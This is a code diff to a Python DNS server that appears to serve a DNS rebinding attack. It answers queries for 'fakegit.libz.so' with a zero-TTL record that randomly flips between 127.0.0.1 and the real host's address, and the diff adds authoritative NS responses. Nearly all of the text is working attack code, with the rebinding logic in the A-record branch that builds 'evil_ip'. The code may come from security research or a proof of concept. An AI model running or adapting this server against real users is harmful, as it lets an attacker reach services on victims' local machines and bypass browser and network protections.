@@ -13,11 +13,26 @@ def addr_to_dns_repr(addr):
     return b''.join(label_to_dns_repr(label) for label in addr.split('.'))
 
 
+def pack_ttl_with_data(ttl, data):
+    return b''.join([
+        struct.pack('>IH', ttl, len(data)),
+        data,
+    ])
+
+
+def to_expected_query(addr, tp):
+    return addr + struct.pack('>HH', tp, IN_CLASS)
+
+
 A_TYPE = 1
+NS_TYPE = 2
 IN_CLASS = 1
-EXPECTED_QUERY = addr_to_dns_repr('fakegit.libz.so.') + struct.pack('>HH', A_TYPE, IN_CLASS)
-TTL = 0
+
+EXPECTED_ADDR = addr_to_dns_repr('fakegit.libz.so.')
 FAKEGIT_ADDR = socket.gethostbyname('libz.so')
+
+FAKE_TTL = 0
+NS_TTL = 3600
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -40,11 +55,15 @@ while True:
         print(f'Dropping the packet because it has more than one query', file=sys.stderr)
         continue
 
-    query = packet[header_len:header_len + len(EXPECTED_QUERY)]
-    can_answer = query == EXPECTED_QUERY
+    query = packet[header_len:header_len + len(EXPECTED_ADDR) + 4]
+    query_type = next((
+        tp
+        for tp in (A_TYPE, NS_TYPE)
+        if query.lower() == to_expected_query(EXPECTED_ADDR, tp)
+    ), None)
 
     # Respond with an single answer to the first query and nothing else.
-    answer_count = int(can_answer)
+    answer_count = query_type is not None
     # Indicate that this message is a response and copy the "recursion desired" bit from the query.
     # Also indicate this is an authoritative response for `fakegit.libz.so`.
     # Zero out everything else (in particular, unset the "recursion available" bit).
@@ -52,15 +71,21 @@ while True:
     response_header = struct.pack(header_fmt, transaction_id, answer_flags, query_count, answer_count, 0, 0)
 
     answer = b''.join([response_header, query])
-    if can_answer:
+    expected_query = to_expected_query(EXPECTED_ADDR, query_type) if query_type is not None else None
+    if query_type == A_TYPE:
         evil_ip = '127.0.0.1' if os.urandom(1)[0] % 4 == 0 else FAKEGIT_ADDR
         packed_evil_ip = ipaddress.IPv4Address(evil_ip).packed
         answer += b''.join([
-            EXPECTED_QUERY,
-            struct.pack('>IH', TTL, len(packed_evil_ip)),
-            packed_evil_ip,
+            expected_query,
+            pack_ttl_with_data(FAKE_TTL, packed_evil_ip),
         ])
         print(f'Responded with {evil_ip} to an A query')
+    elif query_type == NS_TYPE:
+        answer += b''.join([
+            expected_query,
+            pack_ttl_with_data(NS_TTL, addr_to_dns_repr('ns.libz.so.')),
+        ])
+        print(f'Responded to a NS query')
     else:
         print(f'Sending an empty response to unsupported query: {query}')
 
